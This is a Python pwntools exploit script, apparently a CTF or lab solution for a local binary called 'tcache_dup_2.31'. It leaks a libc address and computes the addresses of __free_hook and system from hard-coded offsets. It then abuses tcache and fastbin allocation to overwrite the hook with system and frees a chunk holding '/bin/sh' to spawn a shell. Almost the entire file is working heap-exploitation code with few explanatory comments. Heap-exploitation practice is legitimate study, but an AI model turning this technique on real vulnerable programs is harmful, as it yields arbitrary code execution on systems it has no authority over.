from pwn import *

context.binary = "./tcache_dup_2.31"
p = process()
script = """
b*main+446
b*main+597
"""
def malloc(myidx: int, content: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(myidx).encode())
    p.sendafter(b'data: ', content)

def free(myidx: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(myidx).encode())



p.recvuntil(b'puts() @')
leak_libc = int(p.recvline().strip(b'\n'),16)
log.success("Leak libc: %s", hex(leak_libc))
libc_base = leak_libc - 0x6fbc0
free_hook = libc_base + 0x3b7e48
system_func = libc_base + 0x43080

log.success("Libc base : %s", hex(libc_base))
log.success("Free hook : %s", hex(free_hook))

for i in range(8):
    malloc(40,cyclic(8)) #Malloc all 7 chunks to get all to the tcachebins, last chunk will go to the fastbins

for i in range(8):
    free(i) # Put all first 7 chunks to tcachebins

for i in range(7):
    malloc(40,cyclic(8))



free(7)


# for i in range(7):
#     malloc(40,b'/bin/sh\x00') #Then malloc all 7 freed chunks in tcachebins in order to edit free chunks in fastbins



malloc(40,p64(free_hook-0x10))
gdb.attach(p,script)
malloc(40,b'/bin/sh\x00')
malloc(40,p64(system_func))

free(16)



p.interactive()